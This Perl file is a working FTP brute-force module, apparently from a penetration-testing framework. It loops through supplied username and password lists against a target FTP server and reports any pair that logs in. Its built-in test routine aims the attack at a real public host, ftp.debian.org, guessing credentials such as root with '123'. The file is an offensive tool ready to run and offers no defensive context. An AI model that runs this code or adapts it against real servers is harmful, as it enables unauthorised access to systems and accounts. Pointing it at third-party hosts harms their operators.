# FTP bruteforce
# ---

use MooseX::Declare;
use core::task qw(execute);

# FTP bruteforce
class FTP_Bruteforce extends Task {
    use constant TIMEOUT => 3600;
    use Net::FTP;

    # Process
    method _process(Str $target, $users, $passw) {
        my ($cnt, $ftp);

        unless ($ftp = Net::FTP->new($target)) {
            $self->_write_result("Failed to connect to $target.");
            return;
        }

        $cnt = 0;

        map {
            my $user = $_;
            chomp($user);

            map {
                my $try = $_;
                chomp($try);

                if ($ftp->login($user, $try)) {
                    $self->_write_result("pair $user:$try is good for $target\n");
                    return;
                }

                $cnt++;
                sleep(1);
            } @$passw;
        } @$users;

        $self->_write_result("tried $cnt user:pass combinations on $target, none succeeded...\n");
        $ftp->quit();
    }

    # Main function
    method main($args) {
        my ($users, $passw);

        $users = $self->_get_arg($args, 0);
        $passw = $self->_get_arg($args, 1);

        $self->_process($self->target, $users, $passw);
    }

    # Test function
    method test {
        $self->_process("ftp.debian.org", ["root", "test"], ["123", "qwerty"]);
    }
}

execute(FTP_Bruteforce->new());
